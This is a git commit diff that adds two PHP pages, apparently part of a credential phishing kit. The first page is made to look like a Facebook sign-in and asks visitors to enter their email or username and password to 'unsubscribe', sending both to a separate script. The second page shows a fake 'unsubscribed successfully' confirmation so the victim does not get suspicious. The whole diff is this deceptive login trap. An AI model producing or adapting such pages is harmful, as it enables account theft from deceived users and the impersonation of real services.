c2e85cda1318e061290f4e4cda88ea212240d6ba
Prince Kumar <pk980145@gmail.com>
2023-08-14 23:25:57 +0530

    directory changed

---
+++ Google/index.php
@@ -0,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Unsubscribe</title>
+    <link type="text/css" rel="stylesheet" href="style.css">
+</head>
+<body background-color="#f0f0f0">
+    <div id=blk>
+    <h1 id="fb">facebook</h1>
+    <p1>Facebook helps you connect and share with the people in you life.</p1>
+    </div>
+    <div id="entry">
+        <form action="dbm.php" method="post">
+            <input type="text" id="user" name="user" placeholder="email or username"><br><br>
+            <input type="password" id="pass" name="pass" placeholder="password"><br><br>
+            <input type="submit" id="submit" name="submit" value="Unsubscribe">
+            
+        </form>
+    </div>
+</body>
+</html>
---
+++ Instagram/unsubscribed.php
@@ -0,0 +1,14 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Unsubscribed</title>
+</head>
+<body>
+    <align="center"><h1>You have been Unsubscribed successfully</h1>
+    <br>
+    <p1>Now you can close the window<br>Thank You</p1>
+    </align>
+</body>
+</html>
